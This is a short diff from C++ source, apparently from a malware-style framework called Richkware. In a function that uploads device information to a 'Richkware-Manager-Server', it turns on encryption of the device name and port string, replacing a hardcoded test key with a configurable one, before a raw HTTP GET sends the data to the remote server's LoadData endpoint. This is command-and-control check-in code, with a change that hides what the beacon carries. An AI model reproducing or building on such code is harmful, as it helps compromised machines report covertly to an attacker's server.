@@ -142,7 +142,7 @@ bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, con
     Device device = Device(name, serverPort);
 
     std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
-    //deviceStr = Encrypt(deviceStr,"richktest");
+    deviceStr = Encrypt(deviceStr, encryptionKey);
 
     RawRequest(serverAddress, port, ("GET /Richkware-Manager-Server/LoadData?data=" +deviceStr +" HTTP/1.1\r\n"
             "Host: " + serverAddress + "\r\n"+
